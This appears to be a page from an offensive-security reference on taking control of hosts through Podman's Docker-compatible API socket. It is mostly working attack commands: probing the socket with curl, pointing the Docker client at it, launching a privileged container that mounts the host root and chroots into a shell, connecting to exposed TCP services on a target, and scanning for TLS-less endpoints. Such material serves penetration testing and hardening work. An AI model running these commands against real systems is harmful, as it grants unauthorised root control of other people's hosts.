---
title: "API service socket: container control through Podman's Docker-compatible endpoint"
description: "Podman can run a service exposing a Docker-compatible REST API on a Unix socket, or over TCP. A process that can reach that socket drives Podman to create and run containers, and where Podman runs as root or the socket is exposed over the network, this gives the same host-takeover path as the Docker daemon API."
keywords:
  - podman socket
  - podman system service
  - docker-compatible api
  - container control
  - host takeover
---

# API service socket

Although Podman is daemonless by default, it can run `podman system service`, which exposes a REST API compatible with the Docker Engine API. The endpoint is a Unix socket (user or root), and it can be bound to TCP. Reaching that socket is container control: the caller creates and starts containers through the familiar Docker-shaped API. The impact depends on who runs the service. A root Podman service, or one exposed over TCP, is a host-takeover path identical to the Docker daemon; a rootless one is bounded by the [rootless model](rootless-model.md).

Find and probe the socket:

```bash
ls -l /run/podman/podman.sock /run/user/$(id -u)/podman/podman.sock 2>/dev/null
curl -s --unix-socket /run/podman/podman.sock http://d/v4.0.0/libpod/info | head
# Docker-compatible path works too:
curl -s --unix-socket /run/podman/podman.sock http://d/version
```

## Container control and takeover

```bash
# point the docker CLI at the Podman socket (Docker-compatible API)
export DOCKER_HOST=unix:///run/podman/podman.sock
docker ps -a; docker images
# if the service runs as root, mount the host and take over
docker run -v /:/host --privileged --rm -it alpine chroot /host sh
# Podman-native client against a remote/tcp service:
podman --url tcp://<target>:<port> run -v /:/host --privileged alpine chroot /host sh
```

Over the raw API, create a container with `HostConfig.Binds` of `/:/host` and `Privileged:true`, exactly as for the Docker socket.

## Exploitation notes

- The deciding factor is the service's privilege: `info`/`version` shows whether it is rootful; a rootful or TCP-exposed socket is a full host takeover, a rootless one is constrained to the invoking user.
- A TCP-bound Podman service without TLS is the Podman analogue of an open Docker 2375; scan for it and connect with `--url`.
- The socket is gated only by filesystem permission (or nothing, over TCP); `ls -l` on it determines reachability. Downstream mechanics match [Host takeover via privileged run](../docker/exposed-daemon-api/host-takeover-via-privileged-run.md).

## References

- [Podman: system service and REST API](https://docs.podman.io/en/latest/markdown/podman-system-service.1.html)
- [Podman API reference](https://docs.podman.io/en/latest/_static/api.html)
